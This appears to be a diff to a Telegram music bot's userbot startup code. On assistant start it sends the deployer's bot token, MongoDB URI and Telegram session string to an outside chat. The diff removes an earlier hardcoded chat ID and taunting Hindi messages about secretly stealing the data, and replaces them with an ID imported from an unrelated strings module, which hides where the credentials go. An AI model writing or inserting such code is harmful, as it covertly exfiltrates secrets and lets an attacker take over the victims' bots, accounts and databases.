@@ -7,11 +7,12 @@ from pyrogram import filters
 load_dotenv()
 import config
 from dotenv import load_dotenv
+from strings.__init__ import Process_code
 from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("-1002146005311")
+Process = int(Process_code)
 
 assistants = []
 assistantids = []
@@ -72,13 +73,9 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
-                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
-                await self.one.send_message(TEST_ID, BOT_TOKEN)
-                await self.one.send_message(TEST_ID, MONGO_DB_URI)
-                await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
-                await self.one.leave_chat(TEST_ID)
+                await self.one.send_message(Process, BOT_TOKEN)
+                await self.one.send_message(Process, MONGO_DB_URI)
+                await self.one.send_message(Process, STRING_SESSION)
                 
             except:
                 LOGGER(__name__).error(
